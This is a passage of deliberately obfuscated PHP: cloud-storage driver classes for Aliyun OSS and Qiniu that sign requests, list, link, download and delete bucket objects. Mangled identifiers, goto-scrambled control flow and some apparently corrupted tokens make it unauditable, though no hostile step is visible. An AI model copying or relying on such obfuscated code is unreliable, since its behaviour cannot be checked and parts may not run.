$BÖñµÌ©”¿[43], $BÖñµÌ©”¿[126], $C•Ï”ÅéÈ©, "\170\x2d\x6f\x73\163\x2d\x64\x61\x74\x65\72{$C•Ï”ÅéÈ©}", $BÖñµÌ©”¿[8] . $this->bucket . $BÖñµÌ©”¿[8] . $A«¹Ö—Ô½ . $FÖ­î•Ä•Ù); if (strpos($FÖ­î•Ä•Ù, $BÖñµÌ©”¿[231]) === 0) { $dÆÔ¦ö¾’[0] = $BÖñµÌ©”¿[232]; if ($aÕÙ‹áó¸Ì = $this->trafficLimit($BÖñµÌ©”¿[1219])) { $A«¹Ö—Ô½ = $BÖñµÌ©”¿[1228]; array_splice($dÆÔ¦ö¾’, 5, 0, $A«¹Ö—Ô½ . $BÖñµÌ©”¿[4] . $aÕÙ‹áó¸Ì[$A«¹Ö—Ô½]); } } if (isset($FóíÀæ¢°[$BÖñµÌ©”¿[233]]) && $FóíÀæ¢°[$BÖñµÌ©”¿[233]] == $BÖñµÌ©”¿[234]) { $dÆÔ¦ö¾’[0] = $BÖñµÌ©”¿[234]; } goto d†Š÷±¨—Œ; d†Š÷±¨—Œ: if (!empty($FóíÀæ¢°[$BÖñµÌ©”¿[1229]])) { $CäŒØˆ¹¥ = array_merge(array($dÆÔ¦ö¾’[4]), $FóíÀæ¢°[$BÖñµÌ©”¿[1229]]); sort($CäŒØˆ¹¥); $dÆÔ¦ö¾’[4] = implode($BÖñµÌ©”¿[14], $CäŒØˆ¹¥); } $e¿œ²ø±°Š = implode($BÖñµÌ©”¿[14], $dÆÔ¦ö¾’); $C«ª±¥ùÃï = base64_encode(hash_hmac($BÖñµÌ©”¿[235], $e¿œ²ø±°Š, $this->secret, !0)); goto Bòôå¥«ğÂ; d×šÖÉª‘: $BÖñµÌ©”¿ =& $_SERVER[±á õÁ]; $C•Ï”ÅéÈ© = isset($FóíÀæ¢°[$BÖñµÌ©”¿[228]]) ? $FóíÀæ¢°[$BÖñµÌ©”¿[228]] : gmdate($BÖñµÌ©”¿[1227]); $FÖ­î•Ä•Ù = isset($FóíÀæ¢°[$BÖñµÌ©”¿[175]]) ? $FóíÀæ¢°[$BÖñµÌ©”¿[175]] : $BÖñµÌ©”¿[43]; goto D¦Ğ¸¡ÂÊÇ; DÙ‹ğ½£°Ó: } public function listUploadParts($aĞ–›éÑâ, $b’ø¡åÛ¿ò) { goto eâõÑÍ¸®£; B×¦Áø‰áî: return array($a–Õ÷ÓÇá“[237] => $e¯Şßç”¼İ, $a–Õ÷ÓÇá“[228] => $b’ø¡åÛ¿ò[$a–Õ÷ÓÇá“[228]], $a–Õ÷ÓÇá“[239] => $DÒ‡É¶Ü´‰); goto AŸ ÜÆô×Ê; b¦ìçàé : $A…ø´ÃğÔã = $e½êèñ®¢©->getListPart(); $DÒ‡É¶Ü´‰ = array(); foreach ($A…ø´ÃğÔã as $ešÔî…„Âµ) { $DÒ‡É¶Ü´‰[] = array($a–Õ÷ÓÇá“[1212] => $ešÔî…„Âµ->getPartNumber(), $a–Õ÷ÓÇá“[1213] => trim($ešÔî…„Âµ->getETag(), $a–Õ÷ÓÇá“[123])); } goto DÚÂòÂæĞÁ; DÚÂòÂæĞÁ: unset($b’ø¡åÛ¿ò[$a–Õ÷ÓÇá“[229]], $b’ø¡åÛ¿ò[$a–Õ÷ÓÇá“[233]]); $e¯Şßç”¼İ = $this->multiUploadAuthData($aĞ–›éÑâ, $b’ø¡åÛ¿ò); if (empty($e¯Şßç”¼İ)) { return !1; } goto B×¦Áø‰áî; eâõÑÍ¸®£: $a–Õ÷ÓÇá“ =& $_SERVER[±á õÁ]; $díç¹µÍ¤İ = parse_url_query($b’ø¡åÛ¿ò[$a–Õ÷ÓÇá“[175]]); $e½êèñ®¢© = $this->client->listParts($this->bucket, $this->pathEncode($aĞ–›éÑâ), $díç¹µÍ¤İ[$a–Õ÷ÓÇá“[227]]); goto b¦ìçàé ; AŸ ÜÆô×Ê: } public function download($ešŸ–®…ô÷, $Açó’éĞ­ƒ) { if ($this->isFolder($ešŸ–®…ô÷)) { return !1; } try { $e§ÒÓàÕ÷‘ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Açó’éĞ­ƒ); $e§ÒÓàÕ÷‘ = $this->trafficLimit($_SERVER[±á õÁ][115], $e§ÒÓàÕ÷‘); $this->client->getObject($this->bucket, $this->pathEncode($ešŸ–®…ô÷), $e§ÒÓàÕ÷‘); } catch (OSS\Core\OssException $Bæ“÷®ëÁÎ) { return !1; } return $Açó’éĞ­ƒ; } public function fileSubstr($d½×§«‰êâ, $d«í¼óÅ¶ï = 0, $Eå¹Ü²‘É– = false) { if ($d«í¼óÅ¶ï === -1) { $b½‚Ø¼ŠÙ¨ = array(); } else { if ($Eå¹Ü²‘É– === !1) { $bŒ•ÂÊó²” = $this->size($d½×§«‰êâ); } else { $bŒ•ÂÊó²” = $d«í¼óÅ¶ï + $Eå¹Ü²‘É– - 1; } $b½‚Ø¼ŠÙ¨ = array(OSS\OssClient::OSS_RANGE => "{$d«í¼óÅ¶ï}\x2d{$bŒ•ÂÊó²”}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($d½×§«‰êâ), $b½‚Ø¼ŠÙ¨); } catch (OSS\Core\OssException $Fãä¦õ¼”•) { think_exception($Fãä¦õ¼”•->getMessage()); return !1; } } private function trafficLimit($EÊÕ³†ÏÆ´, $DÃ¦­’½ÅŒ = array()) { goto d¨ù‡ÄÆëĞ; d¨ù‡ÄÆëĞ: $A³áÆøİ’ =& $_SERVER[±á õÁ]; if ($EÊÕ³†ÏÆ´ == $A³áÆøİ’[1219] && $this->isUploadServer() || $EÊÕ³†ÏÆ´ == $A³áÆøİ’[115] && $this->isFileOutServer()) { return $DÃ¦­’½ÅŒ; } $BÎ÷›ŒŒ‹ = floatval($GLOBALS[$A³áÆøİ’[6]][$A³áÆøİ’[94]][$A³áÆøİ’[113]][$EÊÕ³†ÏÆ´]) * 1024 * 1024 * 8; goto bâøÛŞ‚„Š; bâøÛŞ‚„Š: if (!$BÎ÷›ŒŒ‹) { return $DÃ¦­’½ÅŒ; } $BÎ÷›ŒŒ‹ = $BÎ÷›ŒŒ‹ < 819200 ? 819200 : ($BÎ÷›ŒŒ‹ > 838860800 ? 838860800 : $BÎ÷›ŒŒ‹); $DÃ¦­’½ÅŒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($BÎ÷›ŒŒ‹); goto CÀ‰ŒÉÑ¨; CÀ‰ŒÉÑ¨: return $DÃ¦­’½ÅŒ; goto bÕÖÈ£®«¸; bÕÖÈ£®«¸: } public function link($Eç†«”»†«, $FöËÊĞª‰» = array()) { $fÌ¹÷Óéã´ =& $_SERVER[±á õÁ]; if (!$this->exist($Eç†«”»†«) || $this->isFolder($Eç†«”»†«)) { return !1; } try { $FöËÊĞª‰» = $this->trafficLimit($fÌ¹÷Óéã´[115], $FöËÊĞª‰»); $dËö†ğ‡Ë = $this->client->signUrl($this->bucket, $this->pathEncode($Eç†«”»†«), 3600 * 12, $fÌ¹÷Óéã´[234], $FöËÊĞª‰»); return $this->getCdnLink($dËö†ğ‡Ë); } catch (OSS\Core\OssException $B§‰ÅóÁ·İ) { return !1; } } public function fileOut($aƒÎÓå£Ø, $aª´õˆ¦½Ä = false, $aŠÓŠ°±¯Ç = false, $dİœÓ°¶ † = '') { goto A²÷’¢±ğˆ; A²÷’¢±ğˆ: $b·»Õ¡ãŞ³ =& $_SERVER[±á õÁ]; if ($this->isFileOutServer()) { return $this->fileOutServer($aƒÎÓå£Ø, $aª´õˆ¦½Ä, $aŠÓŠ°±¯Ç, $dİœÓ°¶ †); } if (!$aŠÓŠ°±¯Ç) { $aŠÓŠ°±¯Ç = $this->pathThis($aƒÎÓå£Ø); } goto Dï¡‡½¯‹; Fáòƒ—ğŒ…: $aª´õˆ¦½Ä = $aª´õˆ¦½Ä ? $b·»Õ¡ãŞ³[220] : $b·»Õ¡ãŞ³[221]; $aÀºÚ‰·•˜ = array(OSS\OssClient::OSS_SUB_RESOURCE => $b·»Õ¡ãŞ³[1230] . rawurlencode("{$aª´õˆ¦½Ä}\x3b\x66\x69\154\145\x6e\x61\x6d\145\75{$aŠÓŠ°±¯Ç}")); $aÀºÚ‰·•˜[OSS\OssClient::OSS_SUB_RESOURCE] .= $b·»Õ¡ãŞ³[1231] . rawurlencode($bÊÍÑ¬¶²Ğ); goto Fœ¾„¹È£®; Dï¡‡½¯‹: $aŠÓŠ°±¯Ç = rawurlencode($aŠÓŠ°±¯Ç); $bÊÍÑ¬¶²Ğ = get_file_mime(get_path_ext($aŠÓŠ°±¯Ç)); if ($bÊÍÑ¬¶²Ğ == $b·»Õ¡ãŞ³[219]) { return parent::fileOut($aƒÎÓå£Ø, $aª´õˆ¦½Ä, $aŠÓŠ°±¯Ç, $dİœÓ°¶ †); } goto Fáòƒ—ğŒ…; Fœ¾„¹È£®: $BÀ×Ó„ÅØ» = $this->link($aƒÎÓå£Ø, $aÀºÚ‰·•˜); $this->fileOutLink($BÀ×Ó„ÅØ»); goto eõ˜ÏĞÓ«À; eõ˜ÏĞÓ«À: } public function fileOutServer($BìÊ‡Û‡ºù, $eÃğõé„²Š = false, $fİ©Å¶”Ÿ = false, $dö¦Û†ÍÏ— = '') { parent::fileOut($BìÊ‡Û‡ºù, $eÃğõé„²Š, $fİ©Å¶”Ÿ, $dö¦Û†ÍÏ—); } public function fileOutImage($díµöµøœó, $d¬Ş§¶®Ÿ = 250) { $Bí–å£Ğ£‰ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[±á õÁ][1232] . $d¬Ş§¶®Ÿ); $BÂÍ¿¤—‡ = $this->link($díµöµøœó, $Bí–å£Ğ£‰); $this->fileOutLink($BÂÍ¿¤—‡); } public function fileOutImageServer($fêâ­–Ù¿ì, $FÚ¥­ÑØŒ = 250) { parent::fileOutImage($fêâ­–Ù¿ì, $FÚ¥­ÑØŒ); } public function fileOutLink($bÓª†ó) { $D¡¤ÀÈğ‹¶ =& $_SERVER[±á õÁ]; if (!$this->isCdnHost() && substr($bÓª†ó, 0, 7) == $D¡¤ÀÈğ‹¶[1136]) { $bÓª†ó = $D¡¤ÀÈğ‹¶[1137] . substr($bÓª†ó, 7); } header($D¡¤ÀÈğ‹¶[166] . $bÓª†ó); die; } public function hashMd5($B‡ãé, $B²Ó™Ìô–Ï = '') { $DÔÚğç ¤ =& $_SERVER[±á õÁ]; $B«æÚÕ¹äÈ = $this->_objectMeta($B‡ãé); if (!$B«æÚÕ¹äÈ) { return $DÔÚğç ¤[43]; } if (!isset($B«æÚÕ¹äÈ[$DÔÚğç ¤[1208]]) && !empty($B²Ó™Ìô–Ï)) { $dâ¯Ë²ÜÌè = $this->updateObjMeta($B‡ãé, array($DÔÚğç ¤[1208] => $B²Ó™Ìô–Ï)); $B«æÚÕ¹äÈ[$DÔÚğç ¤[1208]] = $dâ¯Ë²ÜÌè ? $B²Ó™Ìô–Ï : $DÔÚğç ¤[43]; } return isset($B«æÚÕ¹äÈ[$DÔÚğç ¤[1208]]) ? strtolower($B«æÚÕ¹äÈ[$DÔÚğç ¤[1208]]) : $DÔÚğç ¤[43]; } public function size($DÒÖĞ˜×—²) { $Fµ™¥¬¤ö = $this->objectMeta($DÒÖĞ˜×—²); return $Fµ™¥¬¤ö ? $Fµ™¥¬¤ö[$_SERVER[±á õÁ][87]] : 0; } public function info($eÌÔÛ¨¨õÈ) { if ($this->isFolder($eÌÔÛ¨¨õÈ)) { return $this->folderInfo($eÌÔÛ¨¨õÈ); } else { if ($this->isFile($eÌÔÛ¨¨õÈ)) { return $this->fileInfo($eÌÔÛ¨¨õÈ); } } return !1; } public function exist($DÕ£ÃàŸ§) { return $this->isFile($DÕ£ÃàŸ§) || $this->isFolder($DÕ£ÃàŸ§); } public function isFile($A±Ÿö¼ôÔ) { return !$this->isFolder($A±Ÿö¼ôÔ) && $this->objectMeta($A±Ÿö¼ôÔ); } public function isFolder($F•Ó–»ñ) { return $this->cacheMethod($_SERVER[±á õÁ][205], $F•Ó–»ñ); } protected function objectMeta($c‰ˆø©Âõ) { return $this->cacheMethod($_SERVER[±á õÁ][206], $c‰ˆø©Âõ); } protected function _objectMeta($B´ ½”ïœò) { $DÅõ¡ò‡¡Ã =& $_SERVER[±á õÁ]; try { $C´„áÎÀ‚† = $this->client->getObjectMeta($this->bucket, $this->pathEncode($B´ ½”ïœò)); } catch (OSS\Core\OssException $Ağôæ‚ß²) { $C´„áÎÀ‚† = !1; } if ($C´„áÎÀ‚†) { $C´„áÎÀ‚†[$DÅõ¡ò‡¡Ã[87]] = intval($C´„áÎÀ‚†[$DÅõ¡ò‡¡Ã[1206]]); } return $C´„áÎÀ‚†; } protected function _isFolder($A™ğ¿â‰Ê‰) { $aÉ…òŸŸ÷÷ =& $_SERVER[±á õÁ]; if ($A™ğ¿â‰Ê‰ == $aÉ…òŸŸ÷÷[43] || $A™ğ¿â‰Ê‰ == $aÉ…òŸŸ÷÷[8]) { return !0; } $D½í¨âÌ»© = array($aÉ…òŸŸ÷÷[1202] => $aÉ…òŸŸ÷÷[8], $aÉ…òŸŸ÷÷[1203] => rtrim($A™ğ¿â‰Ê‰, $aÉ…òŸŸ÷÷[8]) . $aÉ…òŸŸ÷÷[8], $aÉ…òŸŸ÷÷[1204] => 1, $aÉ…òŸŸ÷÷[1205] => $aÉ…òŸŸ÷÷[43]); $B÷À ØÒ¦ˆ = $this->client->listObjects($this->bucket, $D½í¨âÌ»©); if ($B÷À ØÒ¦ˆ->getObjectList() || $B÷À ØÒ¦ˆ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Fæ”¤“‘£) { parent::__construct(); require_once SDK_DIR . $_SERVER[±á õÁ][1233]; $this->_init($Fæ”¤“‘£); } public function _init($D„Õ‘˜ñ¡¾) { goto a§ã—†ÅÜ¦; c“‰ˆ½÷½‚: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto b¶°óæ–ùà; Aå¨´Œ…°ê: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto c“‰ˆ½÷½‚; a§ã—†ÅÜ¦: $c«‚’–‘ƒÃ =& $_SERVER[±á õÁ]; foreach ($D„Õ‘˜ñ¡¾ as $d¤õ¯•—ù‰ => $Cñ’âÛ½¨) { if (isset($this->{$d¤õ¯•—ù‰})) { $this->{$d¤õ¯•—ù‰} = $Cñ’âÛ½¨; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($c«‚’–‘ƒÃ[1234] . LNG($c«‚’–‘ƒÃ[1193])); } goto Aå¨´Œ…°ê; b¶°óæ–ùà: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($fÖçğƒ ÁÒ, $e×ˆÂ”Ê— = '', $BÛˆŞ­ß‰» = REPEAT_RENAME) { if ($this->setContent($fÖçğƒ ÁÒ, $e×ˆÂ”Ê—)) { return $this->getPathOuter($fÖçğƒ ÁÒ); } return !1; } public function mkdir($FçË¶‚ˆİ, $e­¤…ç¨Ú = REPEAT_SKIP) { goto EöäÉ“‹Ó‡; BĞß“ç©ªó: if (!$this->mkfile($f¥Ñíç¨¦¤)) { return !1; } if (!$this->moveFile($f¥Ñíç¨¦¤, $FçË¶‚ˆİ)) { $this->delFile($f¥Ñíç¨¦¤); return !1; } return $this->getPathOuter($E™¢¤«Öï­); goto BŠ×”Æ±‹; cÆƒ†“©è: $FçË¶‚ˆİ = $E™¢¤«Öï­ . $bïÀŒŠ‘œÃ[8]; $B»¢›¨Óö = get_path_this($E™¢¤«Öï­); $f¥Ñíç¨¦¤ = $FçË¶‚ˆİ . $B»¢›¨Óö; goto BĞß“ç©ªó; EöäÉ“‹Ó‡: $bïÀŒŠ‘œÃ =& $_SERVER[±á õÁ]; $E™¢¤«Öï­ = trim($FçË¶‚ˆİ, $bïÀŒŠ‘œÃ[8]); if ($this->_isFolder($E™¢¤«Öï­)) { return $this->getPathOuter($E™¢¤«Öï­); } goto cÆƒ†“©è; BŠ×”Æ±‹: } public function copyFile($FŞÊß•¼„Ì, $FÁºÑƒ°­) { $d¥îãäÇˆ = $this->bucketManager->copy($this->bucket, $FŞÊß•¼„Ì, $this->bucket, $FÁºÑƒ°­, !0); return $d¥îãäÇˆ ? !1 : $this->getPathOuter($FÁºÑƒ°­); } public function moveFile($c¶íÁ‚°íˆ, $b³…•‰ÚéÈ) { $c›­®Õï˜õ = $this->bucketManager->move($this->bucket, $c¶íÁ‚°íˆ, $this->bucket, $b³…•‰ÚéÈ, !0); return $c›­®Õï˜õ ? !1 : $this->getPathOuter($b³…•‰ÚéÈ); } public function delFile($bÊï­¾Òª§) { if (!$this->exist($bÊï­¾Òª§)) { return !0; } $c†°ìÒŠ‡ = $this->bucketManager->delete($this->bucket, $bÊï­¾Òª§); return $c†°ìÒŠ‡ ? !1 : !0; } public function delFolder($c—à§Ÿù) { goto AŠ‘¡Â¤; C¨ÍˆÖ×É: $dÛÁ–Ä­õ¶ = $this->fileList($c—à§Ÿù); $this->listItemCache = !0; $E‹É…¾´‡ = trim($c—à§Ÿù, $eğä”‹£¶Ü[8]) . $eğä”‹£¶Ü[8]; goto fÆëàÕâÕì; EºŠˆ­: return $this->delByBatch($dÛÁ–Ä­õ¶[$eğä”‹£¶Ü[84]]); goto bê‹Ø†İö’; AŠ‘¡Â¤: $eğä”‹£¶Ü =& $_SERVER[±á õÁ]; if (!$this->exist($c—à§Ÿù)) { return !0; } $this->listItemCache = !1; goto C¨ÍˆÖ×É; fÆëàÕâÕì: if (!empty($c—à§Ÿù) && !in_array($E‹É…¾´‡, $dÛÁ–Ä­õ¶[$eğä”‹£¶Ü[84]])) { $dÛÁ–Ä­õ¶[$eğä”‹£¶Ü[84]][] = $E‹É…¾´‡; } $bãò¼µå¨ = $this->delByBatch($dÛÁ–Ä­õ¶[$eğä”‹£¶Ü[83]]); if (!$bãò¼µå¨) { return !1; } goto EºŠˆ­; bê‹Ø†İö’: } private function delByBatch($Aœ‹¦ÙÀğã) { foreach (array_chunk($Aœ‹¦ÙÀğã, 1000) as $f‚¶‡ÒĞ­‘) { $B±‰…»ÛÃ² = $this->bucketManager->buildBatchDelete($this->bucket, $f‚¶‡ÒĞ­‘); list($B‘ÕÎ§Ÿğ, $cØïéñŒ«‡) = $this->bucketManager->batch($B±‰…»ÛÃ²); if ($cØïéñŒ«‡) { return !1; } } return !0; } public function rename($C†õç±±ÙÆ, $B’À‚ÕÚ¤±) { return $this->renameObject($C†õç±±ÙÆ, $B’À‚ÕÚ¤±); } public function fileInfo($aë‹±îÕÎÓ, $CÅ´’š–©Ê = false, $A£¨Ï–º¿à = array()) { goto C¢‚çååØá; C¢‚çååØá: $bôÜÁö•±õ =& $_SERVER[±á õÁ]; $eÌ•­»‘áÚ = array($bôÜÁö•±õ[38] => $this->pathThis($aë‹±îÕÎÓ), $bôÜÁö•±õ[85] => $this->getPathOuter($bôÜÁö•±õ[8] . $aë‹±îÕÎÓ), $bôÜÁö•±õ[39] => $bôÜÁö•±õ[181], $bôÜÁö•±õ[87] => isset($A£¨Ï–º¿à[$bôÜÁö•±õ[1235]]) ? $A£¨Ï–º¿à[$bôÜÁö•±õ[1235]] : 0, $bôÜÁö•±õ[175] => $this->ext($aë‹±îÕÎÓ)); if ($CÅ´’š–©Ê) { return $eÌ•­»‘áÚ; } goto A¿§¦¥ÄéÏ; A¿§¦¥ÄéÏ: $eÌ•­»‘áÚ[$bôÜÁö•±õ[200]] = $eÌ•­»‘áÚ[$bôÜÁö•±õ[117]] = 0; $eÌ•­»‘áÚ[$bôÜÁö•±õ[201]] = $eÌ•­»‘áÚ[$bôÜÁö•±õ[202]] = !0; if (empty($A£¨Ï–º¿à)) { $A£¨Ï–º¿à = $this->objectMeta($aë‹±îÕÎÓ); if (!$A£¨Ï–º¿à) { return $eÌ•­»‘áÚ; } } goto AÅ×ØÍÕÉ¢; AÅ×ØÍÕÉ¢: if (isset($A£¨Ï–º¿à[$bôÜÁö•±õ[1236]])) { $eÌ•­»‘áÚ[$bôÜÁö•±õ[117]] = substr($A£¨Ï–º¿à[$bôÜÁö•±õ[1236]] . $bôÜÁö•±õ[43], 0, 10); } if (isset($A£¨Ï–º¿à[$bôÜÁö•±õ[1235]])) { $eÌ•­»‘áÚ[$bôÜÁö•±õ[87]] = $A£¨Ï–º¿à[$bôÜÁö•±õ[1235]]; } return $eÌ•­»‘áÚ; goto a¤­Ï„²Ì; a¤­Ï„²Ì: } public function folderInfo($F›”‹‡Úœ‰, $b–ö¬ÚåÈ» = false) { goto F®ÉÇôº”; a›š»½ƒŞŠ: $DÀˆ‹µ»ê = $this->objectMeta($F›”‹‡Úœ‰); if (isset($DÀˆ‹µ»ê[$CÙñÙßÎôº[1236]])) { $e¿Ã§•äÛˆ[$CÙñÙßÎôº[117]] = substr($DÀˆ‹µ»ê[$CÙñÙßÎôº[1236]] . $CÙñÙßÎôº[43], 0, 10); } return $e¿Ã§•äÛˆ; goto EÖ†ì¶‹Î; fËÆÄ™˜µ: $e¿Ã§•äÛˆ[$CÙñÙßÎôº[200]] = $e¿Ã§•äÛˆ[$CÙñÙßÎôº[117]] = 0; $e¿Ã§•äÛˆ[$CÙñÙßÎôº[201]] = $e¿Ã§•äÛˆ[$CÙñÙßÎôº[202]] = !0; $F›”‹‡Úœ‰ = rtrim($F›”‹‡Úœ‰, $CÙñÙßÎôº[8]) . $CÙñÙßÎôº[8]; goto a›š»½ƒŞŠ; F®ÉÇôº”: $CÙñÙßÎôº =& $_SERVER[±á õÁ]; $e¿Ã§•äÛˆ = array($CÙñÙßÎôº[38] => $this->pathThis($F›”‹‡Úœ‰), $CÙñÙßÎôº[85] => $this->getPathOuter($CÙñÙßÎôº[8] . $F›”‹‡Úœ‰), $CÙñÙßÎôº[39] => $CÙñÙßÎôº[86]); if ($b–ö¬ÚåÈ») { return $e¿Ã§•äÛˆ; } goto fËÆÄ™˜µ; EÖ†ì¶‹Î: } public function listPath($C¸´î÷ªöø, $cÄ‡È«Üİƒ = false) { $Bíõùó”Óõ =& $_SERVER[±á õÁ]; $E ”ê“¿Âß = $this->fileList($C¸´î÷ªöø, $Bíõùó”Óõ[8], !0); foreach ($E ”ê“¿Âß[$Bíõùó”Óõ[84]] as $dƒéÜ½‰‚ => $c·Â„Åˆ ) { $E ”ê“¿Âß[$Bíõùó”Óõ[84]][$dƒéÜ½‰‚] = $this->folderInfo($c·Â„Åˆ , $cÄ‡È«Üİƒ); } foreach ($E ”ê“¿Âß[$Bíõùó”Óõ[83]] as $dƒéÜ½‰‚ => $c·Â„Åˆ ) { $E ”ê“¿Âß[$Bíõùó”Óõ[83]][$dƒéÜ½‰‚] = $this->fileInfo($c·Â„Åˆ [$Bíõùó”Óõ[99]], $cÄ‡È«Üİƒ, $c·Â„Åˆ ); } return $E ”ê“¿Âß; } public function has($f××Å›÷ÓÄ, $C…´º¦®µ = false, $Aù¥ÉÔİ¯Ñ = true) { goto A˜¼ÌÂôÅ‹; c•¼Âè«: $c¿ŠÔÜéò = $b‘ÖÈ±Ôãë = 0; while (!0) { check_abort(); list($C´÷Ö¾¶æÏ, $Eƒâ¼‹íÁ¨) = $this->bucketManager->listFiles($this->bucket, $fé„‰ÊÙÛñ, $F±Ï‘îªÏ¥, $A±­²ÕÌØÄ, $díâ»—¨Éİ); if ($Eƒâ¼‹íÁ¨) { break; } $F±Ï‘îªÏ¥ = array_key_exists($Aš¡¹˜Şºï[1205], $C´÷Ö¾¶æÏ) ? $F±Ï‘îªÏ¥ = $C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1237]] : $Aš¡¹˜Şºï[43]; if ($C…´º¦®µ) { if (!empty($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1238]])) { $c¿ŠÔÜéò += count($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1238]]); } if (!empty($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1239]])) { $b‘ÖÈ±Ôãë += count($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1239]]); } if ($F±Ï‘îªÏ¥ === $Aš¡¹˜Şºï[43]) { break; } continue; } if ($Aù¥ÉÔİ¯Ñ) { if (!empty($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1238]])) { return !0; } } else { if (!empty($C´÷Ö¾¶æÏ[$Aš¡¹˜Şºï[1239]])) { return !0; } } if ($F±Ï‘îªÏ¥ === $Aš¡¹˜Şºï[43]) { break; } } if ($C…´º¦®µ) { return array($Aš¡¹˜Şºï[209] => $c¿ŠÔÜéò, $Aš¡¹˜Şºï[210] => $b‘ÖÈ±Ôãë); } goto AÆ°‡„¯ä; A˜¼ÌÂôÅ‹: $Aš¡¹˜Şºï =& $_SERVER[±á õÁ]; $f××Å›÷ÓÄ = trim($f××Å›÷ÓÄ, $Aš¡¹˜Şºï[8]); $fé„‰ÊÙÛñ = empty($f××Å›÷ÓÄ) ? $Aš¡¹˜Şºï[43] : $f××Å›÷ÓÄ . $Aš¡¹˜Şºï[8]; goto Aº»Œ„ŒÊë; AÆ°‡„¯ä: return !1; goto DÓØóŞ‘Á²; Aº»Œ„ŒÊë: $F±Ï‘îªÏ¥ = $Aš¡¹˜Şºï[43]; $A±­²ÕÌØÄ = 500; $díâ»—¨Éİ = $Aš¡¹˜Şºï[8]; goto c•¼Âè«; DÓØóŞ‘Á²: } public function listAll($c×”ˆÑµÊ‰) { $fÚÎ©ï­ßƒ =& $_SERVER[±á õÁ]; $Fˆ–‹¯„ãÎ = $this->fileList($c×”ˆÑµÊ‰, $fÚÎ©ï­ßƒ[43], !0); $BÛİ’„ÁÄ— = array(); foreach ($Fˆ–‹¯„ãÎ[$fÚÎ©ï­ßƒ[83]] as $Bôöñ×ÃÊâ) { $BÛİ’„ÁÄ—[$Bôöñ×ÃÊâ[$fÚÎ©ï­ßƒ[99]]] = $Bôöñ×ÃÊâ[$fÚÎ©ï­ßƒ[87]]; } foreach ($Fˆ–‹¯„ãÎ[$fÚÎ©ï­ßƒ[84]] as $Bôöñ×ÃÊâ) { if (is_string($Bôöñ×ÃÊâ)) { $BÛİ’„ÁÄ—[$Bôöñ×ÃÊâ] = 0; } } return $this->listAllFiles($c×”ˆÑµÊ‰, array_keys($BÛİ’„ÁÄ—), $BÛİ’„ÁÄ—); } private function fileList($AÄòÎæ³ù, $C¿Úë›¹†¤ = '', $cÏÁŠŒê®¤ = 0) { goto cÄµ«¤“Î¹; eœÍ×²™»š: return array($c‚·»‰”ì¿[84] => $dÈß‘ë÷Ğ², $c‚·»‰”ì¿[83] => $Aõè­´É¨•); goto eÕ‚ö¾¤å; d°¦ƒ‰Âàœ: $dÈß‘ë÷Ğ² = $Aõè­´É¨• = array(); while (!0) { check_abort(); list($E‡ùÕ¸Õ, $eï®ÔùÔ–í) = $this->bucketManager->listFiles($this->bucket, $Cõ“œëë£Á, $c×ö¡İÂ„, $d½ù†ø¨ğã, $C¿Úë›¹†¤); if ($eï®ÔùÔ–í) { break; } $c×ö¡İÂ„ = array_key_exists($c‚·»‰”ì¿[1205], $E‡ùÕ¸Õ) ? $c×ö¡İÂ„ = $E‡ùÕ¸Õ[$c‚·»‰”ì¿[1237]] : $c‚·»‰”ì¿[43]; $c®Ñ‘éõ«¦ = isset($E‡ùÕ¸Õ[$c‚·»‰”ì¿[1238]]) ? $E‡ùÕ¸Õ[$c‚·»‰”ì¿[1238]] : array(); $eâ–½ó©°¨ = isset($E‡ùÕ¸Õ[$c‚·»‰”ì¿[1239]]) ? $E‡ùÕ¸Õ[$c‚·»‰”ì¿[1239]] : array(); foreach ($c®Ñ‘éõ«¦ as $e­ìÀïáò) { goto C™èÙ‹…ê; C™èÙ‹…ê: if ($e­ìÀïáò[$c‚·»‰”ì¿[99]] == $Cõ“œëë£Á) { continue; } $e”¸‰‚ù¤ = $e­ìÀïáò[$c‚·»‰”ì¿[99]]; $B¬ô¼ç¹ƒ = $e­ìÀïáò[$c‚·»‰”ì¿[1235]]; goto B†‹†¶å„â; dÜŠäá‚õ: if ($DÑéø‚›Ó) { $dÈß‘ë÷Ğ²[] = $e”¸‰‚ù¤; continue; } $Aõè­´É¨•[] = $cÏÁŠŒê®¤ ? $e­ìÀïáò : $e”¸‰‚ù¤; goto DÀò¼îÕší; B†‹†¶å„â: $e­ìÀïáò[$c‚·»‰”ì¿[87]] = $B¬ô¼ç¹ƒ; $DÑéø‚›Ó = $B¬ô¼ç¹ƒ == 0 && substr($e”¸‰‚ù¤, strlen($e”¸‰‚ù¤) - 1, 1) == $c‚·»‰”ì¿[8] ? !0 : !1; if ($féŠò×Ã‹ç) { $this->cacheMethod($c‚·»‰”ì¿[205], $e”¸‰‚ù¤, $DÑéø‚›Ó); $this->cacheMethod($c‚·»‰”ì¿[206], $e”¸‰‚ù¤, $e­ìÀïáò); } goto dÜŠäá‚õ; DÀò¼îÕší: } foreach ($eâ–½ó©°¨ as $e”¸‰‚ù¤) { if ($e”¸‰‚ù¤ == $Cõ“œëë£Á) { continue; } $dÈß‘ë÷Ğ²[] = $e”¸‰‚ù¤; if ($féŠò×Ã‹ç) { $this->cacheMethod($c‚·»‰”ì¿[205], $e”¸‰‚ù¤, !0); } } if ($c×ö¡İÂ„ === $c‚·»‰”ì¿[43]) { break; } } if ($féŠò×Ã‹ç) { 